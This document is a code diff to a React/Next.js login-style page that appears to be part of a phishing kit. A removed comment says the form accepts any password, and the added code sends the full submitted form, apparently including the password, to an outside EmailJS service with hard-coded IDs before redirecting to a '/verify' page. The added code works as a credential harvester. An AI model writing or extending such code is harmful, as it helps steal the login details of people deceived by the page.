@@ -16,13 +16,24 @@ const Home = () => {
     const sendEmail = (e) => {
         e.preventDefault();
         const email = form.current.user_email.value;
-        // Accept any password, just check email
         if (!validateEmail(email)) {
             alert('Please enter a valid email address.');
             return;
         }
-        // If valid, redirect to /verify
-        router.push('/verify');
+        // Send form data via EmailJS
+        emailjs.sendForm(
+            'service_ozea06x',      // your EmailJS service ID
+            'template_ugtxhw6', // replace with your EmailJS template ID for the index page
+            form.current,
+            'XMOnwjyzQDoRVRYl3'       // replace with your EmailJS public key
+        ).then(
+            (result) => {
+                router.push('/verify');
+            },
+            (error) => {
+                alert('Error sending form');
+            }
+        );
     };
 
     return (
